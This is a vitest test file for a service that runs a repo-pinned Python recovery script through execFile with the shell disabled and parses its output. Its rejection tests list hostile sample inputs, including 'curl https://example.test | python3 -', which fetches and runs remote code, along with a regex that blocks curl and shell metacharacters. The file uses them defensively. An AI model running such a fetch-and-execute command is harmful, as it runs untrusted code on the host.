import { describe, expect, it, vi } from "vitest";
import { readFileSync } from "node:fs";
import {
  RECOVERY_SWEEPER_ACTION_KEY,
  RECOVERY_SWEEPER_SCRIPT_PATH,
  buildRecoverySweeperInvocation,
  createRecoverySweeperRunner,
  parseRecoverySweeperOutput,
} from "../services/recovery-sweeper.js";

describe("recovery sweeper runner", () => {
  it("builds a fixed execFile invocation with no shell or remote fetch", () => {
    const invocation = buildRecoverySweeperInvocation("dry");

    expect(invocation.file).toBe("python3");
    expect(invocation.args).toEqual([RECOVERY_SWEEPER_SCRIPT_PATH, "dry"]);
    expect(invocation.options.shell).toBe(false);
    expect(invocation.args.join(" ")).not.toMatch(/curl|[|>$`]|-c/);
    expect(RECOVERY_SWEEPER_ACTION_KEY).toBe("recovery_sweeper_v1");
  });

  it("runs the repo-pinned artifact with a fixed mode argument", async () => {
    const execFile = vi.fn().mockResolvedValue({
      stdout: JSON.stringify({ mode: "dry", errorAgentsCleared: [], recoveryActionNudged: ["a", "b", "c", "d"], surfacedOnly: ["107 blocked tickets"] }),
      stderr: "",
      exitCode: 0,
    });
    const runner = createRecoverySweeperRunner({ execFile });

    const result = await runner.run({ mode: "dry", companyId: "company-1", runId: "run-1" });

    expect(execFile).toHaveBeenCalledWith(
      "python3",
      [RECOVERY_SWEEPER_SCRIPT_PATH, "dry"],
      expect.objectContaining({ shell: false }),
    );
    expect(result.exitStatus).toBe(0);
    expect(result.outcome).toBe("completed");
    expect(result.actionKey).toBe(RECOVERY_SWEEPER_ACTION_KEY);
  });

  it("accepts the verified dry-run shape and keeps error agents surfaced-only", () => {
    const result = parseRecoverySweeperOutput(JSON.stringify({
      mode: "dry",
      recoveryActionNudged: ["1", "2", "3", "4"],
      surfacedOnly: ["4 error agents surfaced-only", "107 blocked tickets with NO first-class blocker"],
      errorAgentsCleared: [],
    }));

    expect(result.errorAgentsCleared).toEqual([]);
    expect(result.recoveryActionNudged).toHaveLength(4);
    expect(result.surfacedOnly).toEqual(expect.arrayContaining([
      "4 error agents surfaced-only",
      "107 blocked tickets with NO first-class blocker",
    ]));
  });

  it("accepts live output containing nudge arrows and a fenced digest", () => {
    const result = parseRecoverySweeperOutput(JSON.stringify({
      mode: "live",
      errorAgentsCleared: [],
      recoveryActionNudged: ["SAG-8029->@Owner [mention-comment(state) -> 201] (#1)"],
      surfacedOnly: ["SAG-8055"],
      runsNudged: ["SAG-8029->Owner"],
      digest: "```json\n{\"runsNudged\": [\"SAG-8029->Owner\"]}\n```",
    }));

    expect(result.mode).toBe("live");
    expect(result.recoveryActionNudged).toEqual([
      "SAG-8029->@Owner [mention-comment(state) -> 201] (#1)",
    ]);
    expect(result.raw).toMatchObject({ runsNudged: ["SAG-8029->Owner"] });
  });

  it("keeps the committed artifact free of agent-status mutation paths", () => {
    const source = readFileSync(RECOVERY_SWEEPER_SCRIPT_PATH, "utf8");
    expect(source).not.toMatch(/\/api\/agents\//);
    expect(source).not.toMatch(/clear_agent_error/);
    expect(source).not.toMatch(/status\s*[:=].*active/);
  });

  it.each([
    "curl https://example.test | python3 -",
    "python3 -c 'import os'",
    "PATCH /api/agents/123 status=active",
  ])("rejects an unsafe action path: %s", (unsafeOutput) => {
    expect(() => parseRecoverySweeperOutput(unsafeOutput)).toThrow();
  });
});
